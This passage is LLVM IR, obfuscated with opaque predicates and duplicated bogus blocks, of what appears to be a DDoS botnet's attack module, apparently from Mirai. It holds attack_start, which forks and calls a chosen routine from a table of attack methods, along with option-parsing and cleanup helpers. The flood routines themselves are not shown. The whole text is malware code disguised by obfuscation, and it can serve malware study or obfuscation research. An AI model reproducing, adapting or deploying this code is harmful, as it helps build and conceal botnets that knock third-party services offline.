  %373 = zext i8 %372 to i32
  call void @util_memcpy(i8* %370, i8* %371, i32 %373)
  %374 = load i8, i8* %12, align 1
  %375 = zext i8 %374 to i32
  %376 = load i8*, i8** %3, align 8
  %377 = sext i32 %375 to i64
  %378 = getelementptr inbounds i8, i8* %376, i64 %377
  store i8* %378, i8** %3, align 8
  %379 = load i8, i8* %12, align 1
  %380 = zext i8 %379 to i32
  %381 = load i32, i32* %4, align 4
  %382 = sub nsw i32 %381, %380
  store i32 %382, i32* %4, align 4
  br label %383

; <label>:383:                                    ; preds = %354
  %384 = load i32, i32* @x.5
  %385 = load i32, i32* @y.6
  %386 = sub i32 %384, 1
  %387 = mul i32 %384, %386
  %388 = urem i32 %387, 2
  %389 = icmp eq i32 %388, 0
  %390 = icmp slt i32 %385, 10
  %391 = or i1 %389, %390
  br i1 %391, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %383
  %392 = load i32, i32* %5, align 4
  %393 = add nsw i32 %392, 1
  store i32 %393, i32* %5, align 4
  %394 = load i32, i32* @x.5
  %395 = load i32, i32* @y.6
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBBpart275, label %originalBB68alteredBB

originalBBpart275:                                ; preds = %originalBB68
  br label %282

; <label>:402:                                    ; preds = %originalBBpart254
  br label %403

; <label>:403:                                    ; preds = %402, %250
  %404 = load i32, i32* @x.5
  %405 = load i32, i32* @y.6
  %406 = sub i32 %404, 1
  %407 = mul i32 %404, %406
  %408 = urem i32 %407, 2
  %409 = icmp eq i32 %408, 0
  %410 = icmp slt i32 %405, 10
  %411 = or i1 %409, %410
  br i1 %411, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %403
  %412 = call i32* @__errno_location() #7
  store i32 0, i32* %412, align 4
  %413 = load i32, i32* %6, align 4
  %414 = load i8, i8* %7, align 1
  %415 = load i8, i8* %8, align 1
  %416 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %417 = load i8, i8* %9, align 1
  %418 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %413, i8 zeroext %414, i8 zeroext %415, %struct.attack_target* %416, i8 zeroext %417, %struct.attack_option* %418)
  %419 = load i32, i32* @x.5
  %420 = load i32, i32* @y.6
  %421 = sub i32 %419, 1
  %422 = mul i32 %419, %421
  %423 = urem i32 %422, 2
  %424 = icmp eq i32 %423, 0
  %425 = icmp slt i32 %420, 10
  %426 = or i1 %424, %425
  br i1 %426, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  br label %427

; <label>:427:                                    ; preds = %originalBBpart279, %353, %340, %307, %originalBBpart246, %originalBBpart226, %85, %57, %originalBBpart2, %16
  %428 = load i32, i32* @x.5
  %429 = load i32, i32* @y.6
  %430 = sub i32 %428, 1
  %431 = mul i32 %428, %430
  %432 = urem i32 %431, 2
  %433 = icmp eq i32 %432, 0
  %434 = icmp slt i32 %429, 10
  %435 = or i1 %433, %434
  br i1 %435, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %427
  %436 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %437 = icmp ne %struct.attack_target* %436, null
  %438 = load i32, i32* @x.5
  %439 = load i32, i32* @y.6
  %440 = sub i32 %438, 1
  %441 = mul i32 %438, %440
  %442 = urem i32 %441, 2
  %443 = icmp eq i32 %442, 0
  %444 = icmp slt i32 %439, 10
  %445 = or i1 %443, %444
  br i1 %445, label %originalBBpart283, label %originalBB81alteredBB

originalBBpart283:                                ; preds = %originalBB81
  br i1 %437, label %446, label %449

; <label>:446:                                    ; preds = %originalBBpart283
  %447 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %448 = bitcast %struct.attack_target* %447 to i8*
  call void @free(i8* %448) #6
  br label %449

; <label>:449:                                    ; preds = %446, %originalBBpart283
  %450 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %451 = icmp ne %struct.attack_option* %450, null
  br i1 %451, label %452, label %472

; <label>:452:                                    ; preds = %449
  %453 = load i32, i32* @x.5
  %454 = load i32, i32* @y.6
  %455 = sub i32 %453, 1
  %456 = mul i32 %453, %455
  %457 = urem i32 %456, 2
  %458 = icmp eq i32 %457, 0
  %459 = icmp slt i32 %454, 10
  %460 = or i1 %458, %459
  br i1 %460, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %452
  %461 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %462 = load i8, i8* %9, align 1
  %463 = zext i8 %462 to i32
  call void @free_opts(%struct.attack_option* %461, i32 %463)
  %464 = load i32, i32* @x.5
  %465 = load i32, i32* @y.6
  %466 = sub i32 %464, 1
  %467 = mul i32 %464, %466
  %468 = urem i32 %467, 2
  %469 = icmp eq i32 %468, 0
  %470 = icmp slt i32 %465, 10
  %471 = or i1 %469, %470
  br i1 %471, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br label %472

; <label>:472:                                    ; preds = %originalBBpart287, %449
  %473 = load i32, i32* @x.5
  %474 = load i32, i32* @y.6
  %475 = sub i32 %473, 1
  %476 = mul i32 %473, %475
  %477 = urem i32 %476, 2
  %478 = icmp eq i32 %477, 0
  %479 = icmp slt i32 %474, 10
  %480 = or i1 %478, %479
  br i1 %480, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %472
  %481 = load i32, i32* @x.5
  %482 = load i32, i32* @y.6
  %483 = sub i32 %481, 1
  %484 = mul i32 %481, %483
  %485 = urem i32 %484, 2
  %486 = icmp eq i32 %485, 0
  %487 = icmp slt i32 %482, 10
  %488 = or i1 %486, %487
  br i1 %488, label %originalBBpart291, label %originalBB89alteredBB

originalBBpart291:                                ; preds = %originalBB89
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %30
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %58
  %489 = load i8*, i8** %3, align 8
  %490 = getelementptr inbounds i8, i8* %489, i32 1
  store i8* %490, i8** %3, align 8
  %491 = load i8, i8* %489, align 1
  store i8 %491, i8* %8, align 1
  %492 = load i32, i32* %4, align 4
  %493 = sext i32 %492 to i64
  %_ = shl i64 %493, 1
  %_2 = sub i64 0, %493
  %gen = add i64 %_2, 1
  %_3 = sub i64 0, %493
  %gen4 = add i64 %_3, 1
  %494 = sub i64 %493, 1
  %495 = trunc i64 %494 to i32
  store i32 %495, i32* %4, align 4
  %496 = load i8, i8* %8, align 1
  %497 = zext i8 %496 to i32
  %498 = icmp eq i32 %497, 0
  br label %originalBB1

originalBB8alteredBB:                             ; preds = %originalBB8, %86
  %499 = load i32, i32* %4, align 4
  %500 = sext i32 %499 to i64
  %501 = load i8, i8* %8, align 1
  %502 = zext i8 %501 to i64
  %_9 = sub i64 5, %502
  %gen10 = mul i64 %_9, %502
  %_11 = shl i64 5, %502
  %_12 = sub i64 5, %502
  %gen13 = mul i64 %_12, %502
  %_14 = shl i64 5, %502
  %_15 = sub i64 5, %502
  %gen16 = mul i64 %_15, %502
  %_17 = sub i64 0, 5
  %gen18 = add i64 %_17, %502
  %_19 = sub i64 5, %502
  %gen20 = mul i64 %_19, %502
  %503 = mul i64 5, %502
  %504 = icmp ult i64 %500, %503
  br label %originalBB8

originalBB24alteredBB:                            ; preds = %originalBB24, %109
  br label %originalBB24

originalBB28alteredBB:                            ; preds = %originalBB28, %126
  %505 = load i8, i8* %8, align 1
  %506 = zext i8 %505 to i64
  %507 = call noalias i8* @calloc(i64 %506, i64 24) #6
  %508 = bitcast i8* %507 to %struct.attack_target*
  store %struct.attack_target* %508, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %originalBB28

originalBB32alteredBB:                            ; preds = %originalBB32, %147
  %509 = load i32, i32* %5, align 4
  %510 = load i8, i8* %8, align 1
  %511 = zext i8 %510 to i32
  %512 = icmp slt i32 %509, %511
  br label %originalBB32

originalBB36alteredBB:                            ; preds = %originalBB36, %210
  %513 = load i32, i32* %5, align 4
  %_37 = shl i32 %513, 1
  %_38 = sub i32 0, %513
  %gen39 = add i32 %_38, 1
  %_40 = shl i32 %513, 1
  %514 = add nsw i32 %513, 1
  store i32 %514, i32* %5, align 4
  br label %originalBB36

originalBB44alteredBB:                            ; preds = %originalBB44, %233
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %261
  %515 = load i8, i8* %9, align 1
  %516 = zext i8 %515 to i64
  %517 = call noalias i8* @calloc(i64 %516, i64 16) #6
  %518 = bitcast i8* %517 to %struct.attack_option*
  store %struct.attack_option* %518, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %282
  %519 = load i32, i32* %5, align 4
  %520 = load i8, i8* %9, align 1
  %521 = zext i8 %520 to i32
  %522 = icmp slt i32 %519, %521
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %308
  %523 = load i8*, i8** %3, align 8
  %524 = getelementptr inbounds i8, i8* %523, i32 1
  store i8* %524, i8** %3, align 8
  %525 = load i8, i8* %523, align 1
  %526 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %527 = load i32, i32* %5, align 4
  %528 = sext i32 %527 to i64
  %529 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %526, i64 %528
  %530 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %529, i32 0, i32 1
  store i8 %525, i8* %530, align 8
  %531 = load i32, i32* %4, align 4
  %532 = sext i32 %531 to i64
  %_57 = shl i64 %532, 1
  %_58 = shl i64 %532, 1
  %_59 = sub i64 %532, 1
  %gen60 = mul i64 %_59, 1
  %_61 = sub i64 %532, 1
  %gen62 = mul i64 %_61, 1
  %_63 = sub i64 0, %532
  %gen64 = add i64 %_63, 1
  %533 = sub i64 %532, 1
  %534 = trunc i64 %533 to i32
  store i32 %534, i32* %4, align 4
  %535 = load i32, i32* %4, align 4
  %536 = sext i32 %535 to i64
  %537 = icmp ult i64 %536, 1
  br label %originalBB56

originalBB68alteredBB:                            ; preds = %originalBB68, %383
  %538 = load i32, i32* %5, align 4
  %_69 = sub i32 %538, 1
  %gen70 = mul i32 %_69, 1
  %_71 = shl i32 %538, 1
  %_72 = sub i32 %538, 1
  %gen73 = mul i32 %_72, 1
  %539 = add nsw i32 %538, 1
  store i32 %539, i32* %5, align 4
  br label %originalBB68

originalBB77alteredBB:                            ; preds = %originalBB77, %403
  %540 = call i32* @__errno_location() #7
  store i32 0, i32* %540, align 4
  %541 = load i32, i32* %6, align 4
  %542 = load i8, i8* %7, align 1
  %543 = load i8, i8* %8, align 1
  %544 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %545 = load i8, i8* %9, align 1
  %546 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %541, i8 zeroext %542, i8 zeroext %543, %struct.attack_target* %544, i8 zeroext %545, %struct.attack_option* %546)
  br label %originalBB77

originalBB81alteredBB:                            ; preds = %originalBB81, %427
  %547 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %548 = icmp ne %struct.attack_target* %547, null
  br label %originalBB81

originalBB85alteredBB:                            ; preds = %originalBB85, %452
  %549 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %550 = load i8, i8* %9, align 1
  %551 = zext i8 %550 to i32
  call void @free_opts(%struct.attack_option* %549, i32 %551)
  br label %originalBB85

originalBB89alteredBB:                            ; preds = %originalBB89, %472
  br label %originalBB89
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %15 = call i32 @fork() #6
  store i32 %15, i32* %13, align 4
  %16 = load i32, i32* %13, align 4
  %17 = icmp sgt i32 %16, 0
  br i1 %17, label %21, label %18

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %13, align 4
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %38

; <label>:21:                                     ; preds = %18, %6
  %22 = load i32, i32* @x.7
  %23 = load i32, i32* @y.8
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  %30 = load i32, i32* @x.7
  %31 = load i32, i32* @y.8
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

; <label>:38:                                     ; preds = %18
  store i32 0, i32* %14, align 4
  store i32 0, i32* %14, align 4
  br label %39

; <label>:39:                                     ; preds = %originalBBpart219, %38
  %40 = load i32, i32* %14, align 4
  %41 = load i8, i8* @methods_len, align 1
  %42 = zext i8 %41 to i32
  %43 = icmp slt i32 %40, %42
  br i1 %43, label %44, label %105

; <label>:44:                                     ; preds = %39
  %45 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %46 = load i32, i32* %14, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %45, i64 %47
  %49 = load %struct.attack_method*, %struct.attack_method** %48, align 8
  %50 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %49, i32 0, i32 1
  %51 = load i8, i8* %50, align 8
  %52 = zext i8 %51 to i32
  %53 = load i8, i8* %8, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %52, %54
  br i1 %55, label %56, label %85

; <label>:56:                                     ; preds = %44
  %57 = load i32, i32* @x.7
  %58 = load i32, i32* @y.8
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %56
  %65 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %66 = load i32, i32* %14, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %65, i64 %67
  %69 = load %struct.attack_method*, %struct.attack_method** %68, align 8
  %70 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %69, i32 0, i32 0
  %71 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %70, align 8
  %72 = load i32, i32* %7, align 4
  %73 = load i8, i8* %9, align 1
  %74 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %75 = load i8, i8* %11, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %71(i32 %72, i8 zeroext %73, %struct.attack_target* %74, i8 zeroext %75, %struct.attack_option* %76)
  %77 = load i32, i32* @x.7
  %78 = load i32, i32* @y.8
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %105

; <label>:85:                                     ; preds = %44
  br label %86

; <label>:86:                                     ; preds = %85
  %87 = load i32, i32* @x.7
  %88 = load i32, i32* @y.8
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %86
  %95 = load i32, i32* %14, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %14, align 4
  %97 = load i32, i32* @x.7
  %98 = load i32, i32* @y.8
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart219, label %originalBB6alteredBB

originalBBpart219:                                ; preds = %originalBB6
  br label %39

; <label>:105:                                    ; preds = %originalBBpart24, %39
  %106 = load i32, i32* @x.7
  %107 = load i32, i32* @y.8
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %105
  call void @exit(i32 0) #8
  %114 = load i32, i32* @x.7
  %115 = load i32, i32* @y.8
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  unreachable

originalBBalteredBB:                              ; preds = %originalBB, %21
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %56
  %122 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %123 = load i32, i32* %14, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %122, i64 %124
  %126 = load %struct.attack_method*, %struct.attack_method** %125, align 8
  %127 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %126, i32 0, i32 0
  %128 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %127, align 8
  %129 = load i32, i32* %7, align 4
  %130 = load i8, i8* %9, align 1
  %131 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %132 = load i8, i8* %11, align 1
  %133 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %128(i32 %129, i8 zeroext %130, %struct.attack_target* %131, i8 zeroext %132, %struct.attack_option* %133)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %86
  %134 = load i32, i32* %14, align 4
  %_ = sub i32 0, %134
  %gen = add i32 %_, 1
  %_7 = sub i32 %134, 1
  %gen8 = mul i32 %_7, 1
  %_9 = sub i32 0, %134
  %gen10 = add i32 %_9, 1
  %_11 = sub i32 %134, 1
  %gen12 = mul i32 %_11, 1
  %_13 = shl i32 %134, 1
  %_14 = sub i32 0, %134
  %gen15 = add i32 %_14, 1
  %_16 = sub i32 %134, 1
  %gen17 = mul i32 %_16, 1
  %135 = add nsw i32 %134, 1
  store i32 %135, i32* %14, align 4
  br label %originalBB6

originalBB21alteredBB:                            ; preds = %originalBB21, %105
  call void @exit(i32 0) #8
  br label %originalBB21
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = load i32, i32* @x.9
  %4 = load i32, i32* @y.10
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %11, align 8
  store i32 %1, i32* %12, align 4
  store i32 0, i32* %13, align 4
  %14 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %15 = icmp eq %struct.attack_option* %14, null
  %16 = load i32, i32* @x.9
  %17 = load i32, i32* @y.10
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %15, label %24, label %25

; <label>:24:                                     ; preds = %originalBBpart2
  br label %100

; <label>:25:                                     ; preds = %originalBBpart2
  %26 = load i32, i32* @x.9
  %27 = load i32, i32* @y.10
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %25
  store i32 0, i32* %13, align 4
  %34 = load i32, i32* @x.9
  %35 = load i32, i32* @y.10
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %42

; <label>:42:                                     ; preds = %94, %originalBBpart24
  %43 = load i32, i32* %13, align 4
  %44 = load i32, i32* %12, align 4
  %45 = icmp slt i32 %43, %44
  br i1 %45, label %46, label %97

; <label>:46:                                     ; preds = %42
  %47 = load i32, i32* @x.9
  %48 = load i32, i32* @y.10
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %46
  %55 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %56 = load i32, i32* %13, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %55, i64 %57
  %59 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %58, i32 0, i32 0
  %60 = load i8*, i8** %59, align 8
  %61 = icmp ne i8* %60, null
  %62 = load i32, i32* @x.9
  %63 = load i32, i32* @y.10
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %61, label %70, label %77

; <label>:70:                                     ; preds = %originalBBpart28
  %71 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %72 = load i32, i32* %13, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %71, i64 %73
  %75 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %74, i32 0, i32 0
  %76 = load i8*, i8** %75, align 8
  call void @free(i8* %76) #6
  br label %77

; <label>:77:                                     ; preds = %70, %originalBBpart28
  %78 = load i32, i32* @x.9
  %79 = load i32, i32* @y.10
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %77
  %86 = load i32, i32* @x.9
  %87 = load i32, i32* @y.10
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %94

; <label>:94:                                     ; preds = %originalBBpart212
  %95 = load i32, i32* %13, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %13, align 4
  br label %42

; <label>:97:                                     ; preds = %42
  %98 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %99 = bitcast %struct.attack_option* %98 to i8*
  call void @free(i8* %99) #6
  br label %100

; <label>:100:                                    ; preds = %97, %24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %101 = alloca %struct.attack_option*, align 8
  %102 = alloca i32, align 4
  %103 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %101, align 8
  store i32 %1, i32* %102, align 4
  store i32 0, i32* %103, align 4
  %104 = load %struct.attack_option*, %struct.attack_option** %101, align 8
  %105 = icmp eq %struct.attack_option* %104, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %25
  store i32 0, i32* %13, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %46
  %106 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %107 = load i32, i32* %13, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %106, i64 %108
  %110 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %109, i32 0, i32 0
  %111 = load i8*, i8** %110, align 8
  %112 = icmp ne i8* %111, null
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %77
  br label %originalBB10
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %originalBBpart2, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %54

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %56

; <label>:34:                                     ; preds = %16
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* @x.11
  %37 = load i32, i32* @y.12
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %35
  %44 = load i32, i32* %10, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %10, align 4
  %46 = load i32, i32* @x.11
  %47 = load i32, i32* @y.12
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %11

; <label>:54:                                     ; preds = %11
  %55 = load i8*, i8** %9, align 8
  store i8* %55, i8** %5, align 8
  br label %56

; <label>:56:                                     ; preds = %54, %27
  %57 = load i8*, i8** %5, align 8
  ret i8* %57

originalBBalteredBB:                              ; preds = %originalBB, %35
  %58 = load i32, i32* %10, align 4
  %_ = sub i32 0, %58
  %gen = add i32 %_, 1
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %10, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
